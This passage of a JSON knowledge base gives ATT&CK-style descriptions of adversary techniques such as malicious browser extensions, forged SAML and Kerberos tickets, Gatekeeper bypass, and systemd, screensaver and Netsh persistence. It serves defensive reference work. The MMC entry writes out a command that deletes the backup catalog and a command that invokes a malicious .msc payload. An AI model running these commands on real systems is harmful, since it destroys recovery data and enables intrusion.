    "Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.(Citation: Wikipedia Browser Extension)(Citation: Chrome Extensions Definition)\n\nMalicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.\n\nPrevious to macOS 11, adversaries could silently install browser extensions via the command line using the <code>profiles</code> tool to install malicious <code>.mobileconfig</code> files. In macOS 11+, the use of the <code>profiles</code> tool can no longer install configuration profiles, however <code>.mobileconfig</code> files can be planted and installed with user interaction.(Citation: xorrior chrome extensions macOS)\n\nOnce the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.(Citation: Chrome Extension Crypto Miner)(Citation: ICEBRG Chrome Extensions)(Citation: Banker Google Chrome Extension Steals Creds)(Citation: Catch All Chrome Extension)\n\nThere have also been instances of botnets using a persistent backdoor through malicious Chrome extensions.(Citation: Stantinko Botnet) There have also been similar examples of extensions being used for command & control.(Citation: Chrome Extension C2 Malware)"
  ],
  "forge web credentials: saml tokens": [
    "An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.(Citation: Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>.(Citation: Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML)\n\nAn adversary may utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004) to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.(Citation: Microsoft SolarWinds Customer Guidance) This differs from [Steal Application Access Token](https://attack.mitre.org/techniques/T1528) and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nAn adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Microsoft SolarWinds Customer Guidance)"
  ],
  "credentials from password stores: securityd memory": [
    "An adversary may obtain root access (allowing them to read securityd\u2019s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user\u2019s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware)\n\nIn OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple\u2019s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.(Citation: OS X Keychain)(Citation: External to DA, the OS X Way) Apple\u2019s securityd utility takes the user\u2019s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user\u2019s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)"
  ],
  "subvert trust controls: gatekeeper bypass": [
    "Adversaries may modify file attributes and subvert Gatekeeper functionality to evade user prompts and execute untrusted programs. Gatekeeper is a set of technologies that act as layer of Apple\u2019s security model to ensure only trusted applications are executed on a host. Gatekeeper was built on top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include Code Signing, security policy compliance, Notarization, and more. Gatekeeper also treats applications running for the first time differently than reopened applications.(Citation: TheEclecticLightCompany Quarantine and the flag)(Citation: TheEclecticLightCompany apple notarization )\n\nBased on an opt-in system, when files are downloaded an extended attribute (xattr) called `com.apple.quarantine` (also known as a quarantine flag) can be set on the file by the application performing the download. Launch Services opens the application in a suspended state. For first run applications with the quarantine flag set, Gatekeeper executes the following functions:\n\n1. Checks extended attribute \u2013 Gatekeeper checks for the quarantine flag, then provides an alert prompt to the user to allow or deny execution.(Citation: OceanLotus for OS X)(Citation: 20 macOS Common Tools and Techniques)\n\n2. Checks System Policies - Gatekeeper checks the system security policy, allowing execution of apps downloaded from either just the App Store or the App Store and identified developers.\n\n3. Code Signing \u2013 Gatekeeper checks for a valid code signature from an Apple Developer ID.\n\n4. Notarization - Using the `api.apple-cloudkit.com` API, Gatekeeper reaches out to Apple servers to verify or pull down the notarization ticket and ensure the ticket is not revoked. Users can override notarization, which will result in a prompt of executing an \u201cunauthorized app\u201d and the security policy will be modified.\n\nAdversaries can subvert one or multiple security controls within Gatekeeper checks through logic errors (e.g. [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211)), unchecked file types, and external libraries. For example, prior to macOS 13 Ventura, code signing and notarization checks were only conducted on first launch, allowing adversaries to write malicious executables to previously opened applications in order to bypass Gatekeeper security checks.(Citation: theevilbit gatekeeper bypass 2021)(Citation: Application Bundle Manipulation Brandon Dalton)\n\nApplications and files loaded onto the system from a USB flash drive, optical disk, external hard drive, from a drive shared over the local network, or using the curl command may not set the quarantine flag. Additionally, it is possible to avoid setting the quarantine flag using [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)."
  ],
  "acquire infrastructure": [
    "Adversaries may buy, lease, or rent infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Additionally, botnets are available for rent or purchase.\n\nUse of these infrastructure solutions allows an adversary to stage, launch, and execute an operation. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contact to third-party web services. Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down."
  ],
  "create or modify system process: systemd service": [
    "Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.\n\nSystemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories and have the file extension <code>.service</code>. Each service unit file may contain numerous directives that can execute system commands:\n\n* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. \n* ExecReload directive covers when a service restarts. \n* ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'.\n\nAdversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at system boot.(Citation: Anomali Rocke March 2019)\n\nWhile adversaries typically require root privileges to create/modify service unit files in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories, low privilege users can create/modify service unit files in directories such as <code>~/.config/systemd/user/</code> to achieve user-level persistence.(Citation: Rapid7 Service Persistence 22JUNE2016)"
  ],
  "inter-process communication: xpc services": [
    "Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service <code>C API</code> or the high level <code>NSXPCConnection API</code> in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.(Citation: creatingXPCservices)(Citation: Designing Daemons Apple Dev)\n\nAdversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler.(Citation: CVMServer Vuln)(Citation: Learn XPC Exploitation) This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)."
  ],
  "hide artifacts": [
    "Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)\n\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)"
  ],
  "server software component: terminal services dll": [
    "Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.(Citation: Microsoft Remote Desktop Services)\n\n[Windows Service](https://attack.mitre.org/techniques/T1543/003)s that are run as a \"generic\" process (ex: <code>svchost.exe</code>) load the service's DLL file, the location of which is stored in a Registry entry named <code>ServiceDll</code>.(Citation: Microsoft System Services Fundamentals) The <code>termsrv.dll</code> file, typically stored in `%SystemRoot%\\System32\\`, is the default <code>ServiceDll</code> value for Terminal Services in `HKLM\\System\\CurrentControlSet\\services\\TermService\\Parameters\\`.\n\nAdversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.(Citation: James TermServ DLL) Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal <code>termsrv.dll</code> functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) sessions by either patching the <code>termsrv.dll</code> file or modifying the <code>ServiceDll</code> value to point to a DLL that provides increased RDP functionality.(Citation: Windows OS Hub RDP)(Citation: RDPWrap Github) On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created."
  ],
  "acquire infrastructure: botnet": [
    "Adversaries may buy, lease, or rent a network of compromised systems that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks.(Citation: Norton Botnet) Adversaries may purchase a subscription to use an existing botnet from a booter/stresser service. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566) or Distributed Denial of Service (DDoS).(Citation: Imperva DDoS for Hire)(Citation: Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter)"
  ],
  "exfiltration over web service: exfiltration to code repository": [
    "Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.\n\nExfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network. "
  ],
  "system binary proxy execution: mmc": [
    "Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.(Citation: win_mmc)(Citation: what_is_mmc) MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.(Citation: win_msc_files_overview)\n\nFor example, <code>mmc C:\\Users\\foo\\admintools.msc /a</code> will open a custom, saved console msc file in author mode.(Citation: win_mmc) Another common example is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application window. \n\nAdversaries may use MMC commands to perform malicious tasks. For example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog on the system (i.e. [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)) without prompts to the user (Note: <code>wbadmin.msc</code> may only be present by default on Windows Server operating systems).(Citation: win_wbadmin_delete_catalog)(Citation: phobos_virustotal)\n\nAdversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) class object.(Citation: win_clsid_key) Then, adversaries may create custom consoles with the \u201cLink to Web Address\u201d snap-in that is linked to the malicious CLSID subkey.(Citation: mmc_vulns) Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: <code>mmc.exe -Embedding C:\\path\\to\\test.msc</code>.(Citation: abusing_com_reg)"
  ],
  "develop capabilities": [
    "Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)\n\nAs with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability."
  ],
  "stage capabilities": [
    "Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](https://attack.mitre.org/techniques/T1587)) or obtained ([Obtain Capabilities](https://attack.mitre.org/techniques/T1588)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.(Citation: Volexity Ocean Lotus November 2020)(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)\n\nStaging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):\n\n* Staging web resources necessary to conduct [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) when a user browses to a site.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015)(Citation: ATT ScanBox)\n* Staging web resources for a link target to be used with spearphishing.(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019)\n* Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).(Citation: Volexity Ocean Lotus November 2020)\n* Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)).(Citation: DigiCert Install SSL Cert)"
  ],
  "event triggered execution: screensaver": [
    "Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\\Windows\\System32\\</code>, and <code>C:\\Windows\\sysWOW64\\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.\n\nThe following screensaver settings are stored in the Registry (<code>HKCU\\Control Panel\\Desktop\\</code>) and could be manipulated to achieve persistence:\n\n* <code>SCRNSAVE.exe</code> - set to malicious PE path\n* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver\n* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock\n* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed\n\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.(Citation: ESET Gazer Aug 2017)"
  ],
  "compromise infrastructure": [
    "Adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, and third-party web and DNS services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye EPS Awakens Part 2) Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.\n\nUse of compromised infrastructure allows an adversary to stage, launch, and execute an operation. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. For example, adversaries may leverage compromised infrastructure (potentially also in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) to further blend in and support staged information gathering and/or [Phishing](https://attack.mitre.org/techniques/T1566) campaigns.(Citation: FireEye DNS Hijack 2019) \n\nBy using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.(Citation: NSA NCSC Turla OilRig)"
  ],
  "establish accounts": [
    "Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)\n\nFor operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)\n\nEstablishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1)"
  ],
  "compromise accounts: social media accounts": [
    "Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001)), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising social media accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).(Citation: AnonHBGary) Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003))."
  ],
  "cloud service dashboard": [
    "An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.(Citation: Google Command Center Dashboard)\n\nDepending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests."
  ],
  "active scanning: scanning ip blocks": [
    "Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.\n\nAdversaries may scan IP blocks in order to [Gather Victim Network Information](https://attack.mitre.org/techniques/T1590), such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.(Citation: Botnet Scan) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133))."
  ],
  "pre-os boot: component firmware": [
    "Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1542/001) but conducted upon other system components/devices that may not have the same capability or level of integrity checking.\n\nMalicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks."
  ],
  "boot or logon autostart execution: time providers": [
    "Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\</code>.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)\n\nAdversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)"
  ],
  "inter-process communication": [
    "Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) or [Component Object Model](https://attack.mitre.org/techniques/T1559/001). Linux environments support several different IPC mechanisms, two of which being sockets and pipes.(Citation: Linux IPC) Higher level execution mediums, such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s, may also leverage underlying IPC mechanisms. Adversaries may also use [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) to facilitate remote IPC execution.(Citation: Fireeye Hunting COM June 2019)"
  ],
  "stage capabilities: install digital certificate": [
    "Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.(Citation: DigiCert Install SSL Cert)\n\nAdversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. \n\nAdversaries can obtain digital certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) or create self-signed certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1587/003)). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584))."
  ],
  "event triggered execution: netsh helper dll": [
    "Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>.\n\nAdversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.(Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)"
  ],
  "steal or forge kerberos tickets: silver ticket": [
    "Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.(Citation: ADSecurity Silver Tickets)\n\nSilver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.(Citation: ADSecurity Detecting Forged Tickets)\n\nPassword hashes for target services may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or [Kerberoasting](https://attack.mitre.org/techniques/T1558/003)."
  ],
  "acquire infrastructure: virtual private server": [
    "Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.\n\nAcquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.(Citation: TrendmicroHideoutsLease)"
  ],
  "compromise infrastructure: virtual private server": [
    "Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.(Citation: NSA NCSC Turla OilRig)\n\nCompromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party."
  ],
  "search open websites/domains: search engines": [
    "Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)\n\nAdversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566))."
  ],
  "defacement": [
    "Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for [Defacement](https://attack.mitre.org/techniques/T1491) include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of [Defacement](https://attack.mitre.org/techniques/T1491) in order to cause user discomfort, or to pressure compliance with accompanying messages. \n"
  ],
  "cloud service discovery": [
    "An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. \n\nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API)\n\nStormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu)"
  ],
  "subvert trust controls: install root certificate": [
    "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses 